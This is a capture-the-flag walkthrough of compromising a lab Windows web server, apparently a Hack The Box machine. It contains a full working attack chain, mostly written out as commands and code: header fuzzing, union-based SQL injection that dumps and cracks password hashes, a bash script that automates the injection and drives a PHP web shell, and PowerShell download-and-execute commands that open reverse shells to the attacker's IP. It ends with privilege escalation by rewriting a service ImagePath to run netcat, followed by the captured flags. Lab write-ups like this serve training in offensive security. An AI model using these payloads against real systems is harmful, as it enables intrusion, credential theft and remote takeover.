**Skills Required**
Basic knowledge of Windows
**Skills Learned**
Basic SQL Injection
Hash Cracking
File System Enumeration
Service Enumeration
Windows Defender Evasion

The intrusion is through the website
Checking the website I found an Admin page , but the access is denied, I need to go through a proxy to access in this page(header missing).

We are going to brute force the headers to find the missing header.

``` bash
# Use seclist -> Misselanium -> web -> http-request-headers -> non standard fields.txt

❯ wfuzz -w /usr/share/seclists/Miscellaneous/web/http-request-headers/http-request-headers-common-non-standard-fields.txt -H "FUZZ: 192.168.4.28" http://10.10.10.167/admin.php
"X-Forwarded-For"

```

Wfuzz found the correct header "X-Forwarded-For: 192.168.4.28" we can add this header using burpsuite or a browser extension

After using the correct header, we found a "find products" application, trying the common payload " ' " we got sql error, this seems to be vulnerable to sql injection.

``` bash
10.10.10.167/admin.php
' order by 100-- -
' order by 6-- - -> are 6 columns
	' union select 1,2,3,schema_name,5,6 from information_schema.schemata-- - #-> mysql
' union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema="mysql"-- - #-> user
' union select 1,2,3,column_name,5,6 from information_schema.columns where table_schema="mysql" and table_name="user"-- - #-> User:Password
' union select 1,2,3,4,group_concat(User,":",Password),6 from mysql.user-- -
root:0A4A5CAD344718DC418035A1F4D292BA603134D8
root:0A4A5CAD344718DC418035A1F4D292BA603134D8
root:0A4A5CAD344718DC418035A1F4D292BA603134D8
root:0A4A5CAD344718DC418035A1F4D292BA603134D8
manager:CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA --> l3tm3!n
hector:0E178792E8FC304A2E3133D535D38CAF1DA3CD9D --> l33th4x0rhector

```

Sqlinjection bash script (learning bash/ In process)
``` bash
#!/bin/bash
#
trap ctrl_c INT

color_prompt="\033[1;93m" # Amarillo
color_output="\033[1;32m" # Verde
color_reset="\033[0m"     # Restablecer color

function ctrl_c() {
    echo -e "\n\n\033[0;31m[!] Exiting...\033[0m"
    exit 1
}
main_url="http://10.10.10.167/search_products.php"

  echo -ne "\n${color_prompt}[*] Enter 'query' to run a SQL query, 'command' to run a system command, or 'exit' to quit:\n${color_reset}"
  echo -ne "\n${color_prompt}[*] After you retrieve the data from the database, try injecting .php files to execute commands:\n${color_reset}"

  echo -ne "\n${color_prompt}[>] Ex:' union select 1,2,3,\"<?php system($_REQUEST['cmd']); ?>\",5,6 into outfile 'C:\\\\\\\\\\\\\\\inetpub\\\\\\\\\\\\\\\wwwroot\\\\\\\\\\\\\\\cmd.php'-- - \n\n${color_reset}"

function Execute_Query {
  sql_query="$1"
  
  output=$(curl -s -X POST "$main_url" -H "X-Forwarded-For: 192.168.4.28" -d "productName=$sql_query" | awk '/<tbody>/,/<\/tbody>/' | html2text | sed 's/1| 2| 3| //' | sed 's/| 5| 6//' | sed 's/|  |  |  |//')

  echo -e "${color_prompt}$output${color_reset}"
}
function Execute_Command {
  main_url_command="http://10.10.10.167/pwned.php"

  command="$1"
  echo $command 
  output=$(curl -s -X GET -G "$main_url_command" --data-urlencode "cmd=$command" | sed 's/1	2	3	//' | sed 's/	5	6//')

  echo -e "${color_prompt}$output${color_reset}"
}

while true; do 
  read -p "╭─ ╱  ~/10.10.10.167_Control ╱ ✔ 
╰─❯ " choice

  if [ "$choice" == "query" ]; then
    read -p "Enter SQL query: " sql_query
    Execute_Query "$sql_query"
  elif [ "$choice" == "command" ]; then
    read -p "Enter command: " command
    Execute_Command "$command"
  elif [ "$choice" == "exit" ]; then
    break 
  else
    echo -e "\n${color_prompt}Invalid choice. Enter 'query' to run a SQL query, 'command' to run a system command, or 'exit' to quit${color_reset}\n"
  fi
done


```


We have credentials, but we don't have a place to use them.
So, We'll try to inject commands in the sql injection queries to try a reverse shell.
``` bash
# The path of the website in the server --> C:\inetpub\wwwroot\prueba.txt
╭─ ╱  ~/10.10.10.167_Control ╱ ✔ 
╰─❯ ' union select 1,2,3,"<?php system($_REQUEST['cmd']); ?>",5,6 into outfile 'C:\\\\inetpub\\\\wwwroot\\\\pwned.php'-- - 
```

Now we have remote command execution, now we use Conptyshell to stablish the reverse shell https://github.com/antonioCoco/ConPtyShell
``` bash
sudo python -m http.server 80
nc -nlvp 1234
	Press -> ctrl z -> stty raw -echo; fg -> enter

# On the website
http://10.10.10.167/cmd.php?cmd=powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
#in the script
powershell%20IEX(New-Object%20Net.WebClient).downloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1')
```

Now we gain access as the user "nt authority\iusr", It's time to escalate privileges
We already have credentials, so we can inject command as the user that we have the credentials with powershell
``` powershell
$user = 'fidelity\hector'
$password = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PScredential $user,$password
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { whoami }
```

Now we can do the same than before to gain access as user "hector" using Invoke-ConPtyShell.ps1

``` powershell
Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5/Invoke-ConPtyShell.ps1') }
```

Now as the user Hector, we use the winpeas tool to enumerate the system

Winpeas report that the user hector have full control in all the system services, so we can manipulate the ImagePath that it execute when the service start , for example the service execute netcat to stablish a reverse shell as the administrator user.

``` powershell
PS C:\users\hector\Desktop> cd C:\Windows\System32\spool\drivers\color 
PS C:\Windows\System32\spool\drivers\color> iwr -uri http://10.10.14.5/nc64.exe -OutFile nc64.exe

PS C:\users\hector\Desktop> reg query HKLM\System\CurrentControlSet\Services\seclogon

    **ImagePath    REG_EXPAND_SZ    %windir%\system32\svchost.exe -k netsvcs -p**

PS C:\users\hector\Desktop> reg add HKLM\System\CurrentControlSet\Services\seclogon /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.5 1234" /f

PS C:\Windows\System32\spool\drivers\color> reg query HKLM\System\CurrentControlSet\Services\seclogon 

    **ImagePath    REG_EXPAND_SZ    C:\Windows\System32\spool\drivers\color\nc64.exe -e cmd 10.10.14.5 1234**
    
#On my machine
❯ rlwrap nc -nlvp 1234

PS C:\Windows\System32\spool\drivers\color> sc start seclogon


```

root flag > d7d941d390a74f7f4b60047436c13946
Uer flag ce859010fbfc5ce75341af2db62ad1d8